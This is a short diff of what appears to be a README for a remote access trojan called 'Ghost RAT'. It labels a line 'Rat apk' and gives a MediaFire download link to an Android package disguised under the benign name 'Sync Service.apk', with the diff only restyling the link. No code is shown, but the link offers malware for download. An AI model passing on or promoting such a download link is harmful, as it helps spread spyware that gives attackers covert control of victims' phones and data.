@@ -1,5 +1,5 @@
 Rat apk 
-https://www.mediafire.com/file/87wwpe9t1xghml5/Sync+Service.apk/file
+*~https://www.mediafire.com/file/87wwpe9t1xghml5/Sync+Service.apk/file~*
 
 
 # 👻 Ghost RAT
